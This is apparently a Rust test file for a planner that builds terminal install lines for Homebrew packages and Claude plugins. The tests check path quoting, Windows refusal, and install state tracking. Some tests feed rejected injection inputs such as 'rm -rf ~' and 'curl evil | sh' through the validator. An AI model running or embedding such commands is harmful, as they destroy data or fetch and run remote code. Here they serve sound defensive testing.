use super::*;
use crate::hive::media::catalogue;

fn here(brew: Option<&str>) -> Here {
    Here { brew: brew.map(PathBuf::from), installer_brew: Some("/opt/homebrew/bin/brew"), claude_root: None, unix: true }
}

fn kit() -> &'static Provider {
    provider("homebrew-kit").expect("the Homebrew kit is in the catalogue")
}

/// Remotion's entry with a marketplace source filled in, as a confirmed one would be.
fn remotion_with(source: &str) -> Provider {
    let mut p = provider("remotion").expect("Remotion is in the catalogue").clone();
    for r in p.routes.iter_mut().filter(|r| r.kind == "plugin") {
        r.marketplace = Some(source.to_string());
    }
    p
}

#[test]
fn the_brew_line_is_the_catalogue_command_with_the_brew_that_is_here() {
    let plan = plan("homebrew-kit", &here(Some("/opt/homebrew/bin/brew"))).unwrap();
    assert_eq!(plan.kind, "brew");
    assert_eq!(plan.line, "/opt/homebrew/bin/brew install ffmpeg imagemagick sox whisper-cpp");
    assert!(!plan.installs_homebrew);
    assert!(plan.whisper_model, "whisper-cpp is in it, so the model follows");
    // The words after `brew` are exactly the catalogue's.
    let cmd = kit().routes.iter().find(|r| r.kind == "brew").and_then(|r| r.command.clone()).unwrap();
    assert_eq!(plan.line.split_once(' ').unwrap().1, cmd.strip_prefix("brew ").unwrap());
}

#[test]
fn with_no_homebrew_the_line_starts_with_its_own_installer_then_calls_the_new_brew() {
    let plan = plan("homebrew-kit", &here(None)).unwrap();
    assert!(plan.installs_homebrew);
    assert_eq!(plan.line, format!("{HOMEBREW_INSTALLER} && /opt/homebrew/bin/brew install ffmpeg imagemagick sox whisper-cpp"));
    assert!(plan.line.starts_with(r#"/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)" && "#));

    let intel = Here { installer_brew: Some("/usr/local/bin/brew"), ..here(None) };
    assert!(plan_for(kit(), &intel).unwrap().line.ends_with("&& /usr/local/bin/brew install ffmpeg imagemagick sox whisper-cpp"));

    let nowhere = Here { installer_brew: None, ..here(None) };
    assert!(plan_for(kit(), &nowhere).unwrap_err().contains("Homebrew doesn't run"));
}

#[test]
fn a_brew_found_in_an_odd_folder_is_one_quoted_word() {
    let plan = plan("homebrew-kit", &here(Some("/Users/a b/brew's/bin/brew"))).unwrap();
    assert_eq!(plan.line, r"'/Users/a b/brew'\''s/bin/brew' install ffmpeg imagemagick sox whisper-cpp");
}

#[test]
fn only_a_plain_brew_install_is_accepted() {
    assert_eq!(brew_formulae("brew install ffmpeg sox"), Some(vec!["ffmpeg", "sox"]));
    assert_eq!(brew_formulae("brew install python@3.12 homebrew/core/sox"), Some(vec!["python@3.12", "homebrew/core/sox"]));
    for bad in ["brew install", "brew upgrade ffmpeg", "brew install --cask x", "brew install ffmpeg; rm -rf ~", "brew install a && b", "brew install $(x)", "brew install FFmpeg", "sudo brew install x", "brew install 'x'"] {
        assert_eq!(brew_formulae(bad), None, "{bad}");
    }
    let mut p = kit().clone();
    p.routes[0].command = Some("brew install ffmpeg; curl evil | sh".to_string());
    assert!(plan_for(&p, &here(Some("/opt/homebrew/bin/brew"))).unwrap_err().contains("isn't a plain `brew install`"));
}

#[test]
fn a_plugin_with_no_confirmed_marketplace_is_refused_with_the_guide() {
    // The shipped catalogue has no confirmed source for Remotion's marketplace (docs/hive-media.md §11).
    let e = plan("remotion", &here(Some("/opt/homebrew/bin/brew"))).unwrap_err();
    assert!(e.contains("Remotion") && e.contains("guide") && e.contains("remotion@remotion"), "{e}");
}

#[test]
fn the_plugin_line_installs_into_the_humans_own_root() {
    let p = remotion_with("remotion-dev/remotion");
    let plan = plan_for(&p, &here(None)).unwrap();
    assert_eq!(plan.kind, "plugin");
    assert!(!plan.installs_homebrew, "a plugin needs no Homebrew");
    assert_eq!(plan.line, "env -u CLAUDE_CONFIG_DIR claude plugin marketplace add remotion-dev/remotion; env -u CLAUDE_CONFIG_DIR claude plugin install remotion@remotion");

    let own = Here { claude_root: Some(PathBuf::from("/Users/me/My Claude")), ..here(None) };
    assert_eq!(
        plan_for(&p, &own).unwrap().line,
        "env CLAUDE_CONFIG_DIR='/Users/me/My Claude' claude plugin marketplace add remotion-dev/remotion; env CLAUDE_CONFIG_DIR='/Users/me/My Claude' claude plugin install remotion@remotion"
    );
}

#[test]
fn a_plugin_install_never_reaches_a_hive_worker() {
    // Coordinator only (docs/hive-media.md §4): the line names the human's root and nothing of a
    // Hive (workers launch with `--setting-sources project`, which `hive::launch`'s tests pin, so
    // a user-scope plugin never loads in one).
    let line = plan_for(&remotion_with("remotion-dev/remotion"), &here(None)).unwrap().line;
    assert!(line.contains("CLAUDE_CONFIG_DIR"), "pinned to a root, whatever account the tab spawned under: {line}");
    assert!(!line.contains("hive") && !line.contains("--scope project") && !line.contains("--scope local"), "{line}");
}

#[test]
fn a_plugin_route_with_odd_words_is_refused() {
    for bad in ["-x", "a b", "a;b", "$(x)", "a|b", ""] {
        assert!(plan_for(&remotion_with(bad), &here(None)).is_err(), "{bad:?}");
    }
    let mut p = remotion_with("remotion-dev/remotion");
    p.routes[0].plugin_id = Some("remotion".to_string());
    assert!(plan_for(&p, &here(None)).unwrap_err().contains("name@marketplace"));
}

#[test]
fn an_unknown_provider_or_a_route_that_is_not_brew_or_plugin_is_refused() {
    assert!(plan("no-such-thing", &here(None)).unwrap_err().contains("no media provider"));
    for id in ["fal", "elevenlabs", "comfyui"] {
        let Some(p) = provider(id) else { continue };
        let e = plan_for(p, &here(None)).unwrap_err();
        assert!(e.contains("isn't installed in a terminal tab"), "{id}: {e}");
    }
    // And a brew route on a system with no POSIX shell.
    let windows = Here { unix: false, ..here(Some("/opt/homebrew/bin/brew")) };
    assert!(plan_for(kit(), &windows).unwrap_err().contains("macOS or Linux"));
}

#[test]
fn every_brew_and_plugin_provider_in_the_catalogue_gets_a_line_or_a_plain_refusal() {
    for p in &catalogue().providers {
        let Some(route) = p.routes.iter().find(|r| r.kind == "brew" || r.kind == "plugin") else { continue };
        match plan_for(p, &here(Some("/opt/homebrew/bin/brew"))) {
            Ok(plan) => {
                assert_eq!(plan.kind, route.kind, "{}", p.id);
                assert!(!plan.line.contains('\n') && !plan.line.contains('`'), "{}: {}", p.id, plan.line);
            }
            Err(e) => assert!(route.kind == "plugin" && route.marketplace.is_none() && e.contains("guide"), "{}: {e}", p.id),
        }
    }
}

// ─── Installs in flight ─────────────────────────────────────────────────────

fn brew_plan() -> InstallPlan {
    plan("homebrew-kit", &here(Some("/opt/homebrew/bin/brew"))).unwrap()
}

#[test]
fn the_d_after_the_lines_b_ends_it_and_says_how() {
    let mut s = Installs::default();
    s.begin("i1", &brew_plan(), "main").unwrap();
    assert!(s.osc("p1", 'B', None).is_none(), "not armed: not ours");
    s.arm("i1", "t1", "p1").unwrap();
    assert!(s.is_armed("i1"));
    assert!(s.osc("p1", 'D', Some(0)).is_none(), "a D before the line's B is an empty prompt cycle");
    assert!(s.osc("p2", 'B', None).is_none(), "another shell");
    assert!(s.osc("p1", 'B', None).is_none());
    let (i, done) = s.osc("p1", 'D', Some(0)).expect("its exit");
    assert_eq!(i.window, "main");
    assert_eq!(done, InstallFinished { provider_id: "homebrew-kit".into(), tab_id: "t1".into(), ok: true, exit_code: Some(0), ended: "exited".into(), model_download: true });
    assert!(s.osc("p1", 'D', Some(0)).is_none(), "ended once");
}

#[test]
fn a_failed_line_or_a_closed_tab_is_not_ok_and_downloads_nothing() {
    let mut s = Installs::default();
    s.begin("i1", &brew_plan(), "main").unwrap();
    s.arm("i1", "t1", "p1").unwrap();
    s.osc("p1", 'C', None);
    let (_, done) = s.osc("p1", 'D', Some(1)).unwrap();
    assert!(!done.ok && !done.model_download);
    assert_eq!(done.exit_code, Some(1));

    s.begin("i2", &brew_plan(), "main").unwrap();
    s.arm("i2", "t2", "p2").unwrap();
    let (_, done) = s.pty_closed("p2").unwrap();
    assert_eq!((done.ok, done.exit_code, done.ended.as_str()), (false, None, "closed"));
}

#[test]
fn one_install_per_provider_and_no_arm_for_one_given_up() {
    let mut s = Installs::default();
    s.begin("i1", &brew_plan(), "main").unwrap();
    assert!(s.begin("i2", &brew_plan(), "main").unwrap_err().contains("already installing"));
    assert!(s.arm("gone", "t", "p").is_err());
    s.arm("i1", "t1", "p1").unwrap();
    assert!(s.arm("i1", "t1", "p1").is_err(), "typed once");
    s.forget("i1");
    assert!(s.arm("i1", "t1", "p1").is_err(), "a forgotten install types nothing");
    s.begin("i3", &brew_plan(), "main").unwrap();
}

#[test]
fn the_window_must_name_the_tab_it_opened() {
    assert_eq!(started_from(&json!({ "tab_id": "t1", "watches_exit": true }), "L").unwrap(), InstallStarted { tab_id: "t1".into(), command_shown: "L".into(), watches_exit: true });
    assert!(!started_from(&json!({ "tab_id": "t1" }), "L").unwrap().watches_exit);
    assert!(started_from(&json!({ "accepted": true }), "L").is_err());
    assert!(started_from(&json!({ "tab_id": "" }), "L").is_err());
}
